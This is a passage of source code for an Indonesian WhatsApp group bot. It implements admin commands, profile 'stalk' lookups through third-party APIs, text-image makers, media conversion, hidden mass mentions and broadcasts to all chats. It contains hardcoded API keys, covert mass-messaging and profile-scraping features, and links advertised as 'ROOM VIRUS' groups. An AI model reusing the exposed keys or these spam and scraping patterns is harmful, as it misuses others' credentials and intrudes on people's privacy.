if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Hanz.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break

case 'kick' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)   
if (!isBotGroupAdmins) return reply('Bot Bukan Admin :)')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
Hanz.groupRemove(from, mentioned)
}
break
case 'getpic': case 'getpp': case 'getprofile':{
if (!isGroup) return reply(mess.only.group)
reply(mess.wait)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
pp = await Hanz.getProfilePicture(mentioned)
} catch {
pp = `${imagebb}`
}
buffer = await getBuffer(pp)
Hanz.sendMessage(from, buffer, image, {quoted: mek, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: fakeimage, contextInfo:{mentionedJid:[mentioned]}})
}
break
case 'grup':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -118.411
					 },
						"contentText": ` GROUP HANZ々OFC彡
▬▭▬▭▬▭▬▭▬▬▭▬▭
╔═════════════════⎉
║冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
║冬Nomor Owner : ${owner}
║冬Creator : ${creator}
║冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
║冬Prefix : Multi
║冬Battery : ${baterai.battery}
║冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
║冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
║冬Auto Recording : ${autovn ? 'On' : 'Off'}
╚═════════════════❍
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
GROUP HANZ々OFC彡[INFO]
https://chat.whatsapp.com/JPrMnQZao82D6bEeZKBNQ2

GROUP HANZ々OFC彡[BOT WA]
https://chat.whatsapp.com/H2dvuYaI3SbKURzstwl7Wn

ROOM VIRUS 1/2
V1: https://chat.whatsapp.com/GsG7Dvu6ymPL3wqHubftIG

V2: https://chat.whatsapp.com/CuVbS5XaimTIl4LuKTahYq
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
						"buttons": [
							{
								"buttonId": "!command",
								"buttonText": {
									"displayText": `BACK MENU`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!sewabot",
								"buttonText": {
									"displayText": `SEWABOT`,
									},
								"type": "RESPONSE"
							},
							{
								"buttonId": "!donasi",
								"buttonText": {
									"displayText": `DONASI`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
//=======================================FITUR STALK===================================================//
case 'stalkig':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna_11`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `Username : ${ini_result.username}\n`
ini_txt += `Full Name : ${ini_result.fullname}\n`
ini_txt += `Posts : ${ini_result.posts}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
case 'stalktiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna`)
stalk_toktok = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=ikyy69`)
get_result = get_result.result
ini_txt = `Username : ${get_result.username}\n`
ini_txt += `Nickname : ${get_result.nickname}\n`
ini_txt += `Bio : ${get_result.nickname}\n`
ini_txt += `Followers : ${get_result.followers}\n`
ini_txt += `Followings : ${get_result.followings}\n`
ini_txt += `Likes : ${get_result.likes}\n`
ini_txt += `Video : ${get_result.video}\n`
pp_tt = await getBuffer(get_result.user_picture)
Hanz.sendMessage(from, pp_tt, image, { quoted: ftrol, caption: ini_txt })
break
case 'stalkgithub':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} wong_koclok_`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `Name : ${ini_result.name}\n`
ini_txt += `Link : ${ini_result.url}\n`
ini_txt += `Public Repo : ${ini_result.public_repos}\n`
ini_txt += `Public Gists : ${ini_result.public_gists}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
//=========================================MAKER MENU=============================================//
case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
					case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.results)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'googletxt':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris|Ganz`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris|Ganz`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Haris Ganz`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=XChillDs`)
					buffer1 = await getBuffer(anu.result.url)
					Hanz.sendMessage(from, buffer1, image, {quoted: mek, caption: `${makell}\nDah Jadi🤓`,thumbnail:fakeimage})
					break				
//━━━━━━━━━━━━━━━[ FITUR STICKER ]━━━━━━━━━━━━━━━━━//
case 'sticker':
case 's':
case 'stiker':
case 'setiker':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await Hanz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${lolkey}&img=${anu.display_url}&package=${botname}&author=${ownername}`)
	Hanz.sendMessage(from, mengbuff, sticker, {quoted: mek})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
break
case 'attp':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
Hanz.sendMessage(from, buffer, sticker, { quoted: mek })
break
case 'toimg':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker) return reply(' reply stickernya gan')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
buffer = fs.readFileSync(ran)
costum(buffer, image, Verived, `Jangan Lupa Subscribe ʜᴀɴᴢ々ᴏꜰᴄ`)
fs.unlinkSync(ran)
})
break
case 'tomp3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
Hanz.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
Hanz.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: ftrol })
fs.unlinkSync(ran)
})
break
case 'tovideo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker) return reply('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await Hanz.downloadAndSaveMediaMessage(anumedia, './database/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
Hanz.sendMessage(from, buffer, video, { quoted: ftrol, caption: 'Done... Jangan Lupa Subscribe ʜᴀɴᴢ々ᴏꜰᴄ' })
fs.unlinkSync(ran)
})
break				
//~~~~~~~~~~~~~~~~~~~~~[TAG MENU]~~~~~~~~~~~~~~~~~~~~~//
case 'totag':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isGroup) return reply(mess.only.group)			
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: ftrol
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
        case 'infoall': case 'tagall':
									if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = mek.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
var value = body.slice(9)
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
Hanz.sendMessage(from, options, text)
break
//~~~~~~~~~~~~~~~~~~~~~[UP SW]~~~~~~~~~~~~~~~~~~~~~//
case 'upswteks':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (args.length < 1) return reply('Teksnya?')
teks = body.slice(10)
Hanz.sendMessage('status@broadcast', teks, MessageType.text)
reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
                    if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Hanz.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${ownername}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':                    
                    if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                     if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvn':            
					if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')	       
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Hanz.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    Hanz.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    Hanz.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':                       
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    Hanz.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break        
                     
//~~~~~~~~~~~~~~~~~~~~~[BROATSCATS GRUP/PRIVATE]~~~~~~~~~~~~~~~~~~~~~//
					case 'tobc':				
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')					
				Hanz.updatePresence(from, Presence.composing)
					anu = await groupMembers
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Arya).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo :mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'bc2':
      case 'bc':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')      
             if (args.length < 1) return reply('teks?')
             anu = await Hanz.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await Hanz.downloadMediaMessage(encmedia)
             for (let _ of anu) {
